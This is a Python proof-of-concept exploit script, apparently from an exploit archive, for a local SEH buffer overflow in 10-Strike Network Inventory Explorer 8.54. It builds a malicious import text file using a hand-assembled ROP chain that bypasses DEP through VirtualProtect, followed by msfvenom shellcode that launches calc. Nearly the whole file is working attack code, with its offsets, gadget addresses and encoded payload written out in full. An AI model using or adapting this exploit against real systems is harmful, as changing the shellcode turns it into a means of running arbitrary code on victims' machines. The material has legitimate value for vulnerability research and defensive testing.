@@ -1,0 +1,115 @@
+#!/usr/bin/python
+
+# Exploit Author: bzyo
+# Twitter: @bzyo_
+# Exploit Title: 10-Strike Network Inventory Explorer 8.54 - Local Buffer Overflow (SEH)(DEP Bypass)
+# Date: 01-29-19
+# Vulnerable Software: 10-Strike Network Inventory Explorer 8.54
+# Vendor Homepage: https://www.10-strike.com/
+# Version: 8.54 
+# Software Link 1: https://www.10-strike.com/networkinventoryexplorer/network-inventory-setup.exe
+# Tested Windows 7 SP1 x86
+
+# PoC
+# 1. run script
+# 2. open app, select Computers tab  
+# 3. click on 'From Text File'
+# 4. choose 10strike.txt that was generated 
+# 5. pop calc
+
+# manually created ropchain based on mona.py 'rop.txt' and 'ropfunc.txt' finds
+# practicing dep bypass by not using auto generated mona.py ropchains
+
+# original seh poc from Hashim Jawad, EDB: 44838
+# notes from author state offset is based upon username size, username for poc is 'user'
+
+# badchars; \x00\x0a\x0d\x2f
+
+import struct
+
+filename = "10strike.txt"
+
+junk  = "\x41" * 209
+
+seh = struct.pack('<L',0x10013e29)
+
+fill = "\x42"*12
+
+#VirtualProtect()
+#ESI = ptr to VirtualProtect()
+rop = struct.pack('<L',0x7c3762b3)   # POP EAX # RETN 
+rop += struct.pack('<L',0x61e9b30c)  # ptr to &VirtualProtect() 
+rop += struct.pack('<L',0x1001872e)  # MOV EAX,DWORD PTR DS:[EAX] # RETN 
+rop += struct.pack('<L',0x100101f2)  # POP EBX # RETN 
+rop += struct.pack('<L',0xffffffff)  #
+rop += struct.pack('<L',0x100186d1)  # ADD EBX,EAX # XOR EAX,EAX # RETN
+rop += struct.pack('<L',0x7c358a01)  # INC EBX # XOR EAX,EAX # RETN 
+rop += struct.pack('<L',0x7c3501d5)  # POP ESI # RETN
+rop += struct.pack('<L',0xffffffff)  #
+rop += struct.pack('<L',0x61e8509c)  # ADD ESI,EBX # RETN 
+rop += struct.pack('<L',0x7c370464)  # INC ESI # RETN 
+
+#EBP = ReturnTo (ptr to jmp esp)
+#mona.py jmp -r esp -cpb '\x00\x0a\x0d'
+rop += struct.pack('<L',0x61e05892)  # POP EBP # RETN 
+rop += struct.pack('<L',0x61e053a9)  # push esp # ret
+
+#EBX = dwSize x201
+rop += struct.pack('<L',0x7c348495)  # POP EAX # RETN 
+rop += struct.pack('<L',0xfffffdff)  # 
+rop += struct.pack('<L',0x7c351e05)  # NEG EAX # RETN 
+rop += struct.pack('<L',0x100101f2)  # POP EBX # RETN 
+rop += struct.pack('<L',0xffffffff)  #  
+rop += struct.pack('<L',0x61e0579d)  # INC EBX # RETN 
+rop += struct.pack('<L',0x100186d1)  # ADD EBX,EAX # XOR EAX,EAX # RETN 
+	  
+#EDX = NewProtect (0x40)
+rop += struct.pack('<L',0x7c344160)  # POP EDX # RETN 
+rop += struct.pack('<L',0xffffffc0)  # 
+rop += struct.pack('<L',0x7c351eb1)  # NEG EDX # RETN 
+	  
+#ECX = lpOldProtect (ptr to W address)
+rop += struct.pack('<L',0x7c37157a)  # POP ECX # RETN
+rop += struct.pack('<L',0x61e894c0)  # &Writable location sqlite3
+
+#EDI = ROP NOP (RETN)
+rop += struct.pack('<L',0x1001ab53)  # POP EDI # RETN
+rop += struct.pack('<L',0x1001ab54)  # ROP-NOP 
+	  
+#EAX = NOP (0x90909090)
+rop += struct.pack('<L',0x7c3647cc)  # POP EAX # RETN 
+rop += struct.pack('<L',0x90909090)  # nop
+
+#PUSHAD
+rop += struct.pack('<L',0x10019094)  # PUSHAD # RETN 
+
+nops = "\x90"*10
+
+#msfvenom -p windows/exec cmd=calc.exe -b '\x00\x0a\x0d\x3a\x5c' -f python
+#Payload size: 220 bytes
+calc =  ""
+calc += "\xbb\x29\x86\xf9\x07\xda\xdb\xd9\x74\x24\xf4\x5e\x31"
+calc += "\xc9\xb1\x31\x31\x5e\x13\x83\xee\xfc\x03\x5e\x26\x64"
+calc += "\x0c\xfb\xd0\xea\xef\x04\x20\x8b\x66\xe1\x11\x8b\x1d"
+calc += "\x61\x01\x3b\x55\x27\xad\xb0\x3b\xdc\x26\xb4\x93\xd3"
+calc += "\x8f\x73\xc2\xda\x10\x2f\x36\x7c\x92\x32\x6b\x5e\xab"
+calc += "\xfc\x7e\x9f\xec\xe1\x73\xcd\xa5\x6e\x21\xe2\xc2\x3b"
+calc += "\xfa\x89\x98\xaa\x7a\x6d\x68\xcc\xab\x20\xe3\x97\x6b"
+calc += "\xc2\x20\xac\x25\xdc\x25\x89\xfc\x57\x9d\x65\xff\xb1"
+calc += "\xec\x86\xac\xff\xc1\x74\xac\x38\xe5\x66\xdb\x30\x16"
+calc += "\x1a\xdc\x86\x65\xc0\x69\x1d\xcd\x83\xca\xf9\xec\x40"
+calc += "\x8c\x8a\xe2\x2d\xda\xd5\xe6\xb0\x0f\x6e\x12\x38\xae"
+calc += "\xa1\x93\x7a\x95\x65\xf8\xd9\xb4\x3c\xa4\x8c\xc9\x5f"
+calc += "\x07\x70\x6c\x2b\xa5\x65\x1d\x76\xa3\x78\x93\x0c\x81"
+calc += "\x7b\xab\x0e\xb5\x13\x9a\x85\x5a\x63\x23\x4c\x1f\x9b"
+calc += "\x69\xcd\x09\x34\x34\x87\x08\x59\xc7\x7d\x4e\x64\x44"
+calc += "\x74\x2e\x93\x54\xfd\x2b\xdf\xd2\xed\x41\x70\xb7\x11"
+calc += "\xf6\x71\x92\x71\x99\xe1\x7e\x58\x3c\x82\xe5\xa4"
+
+pad = "\x45"*(3000 - len(junk + seh + fill + rop + nops + calc))
+
+buffer = junk + seh + fill + rop + nops + calc + pad
+
+textfile = open(filename , 'w')
+textfile.write(buffer)
+textfile.close()
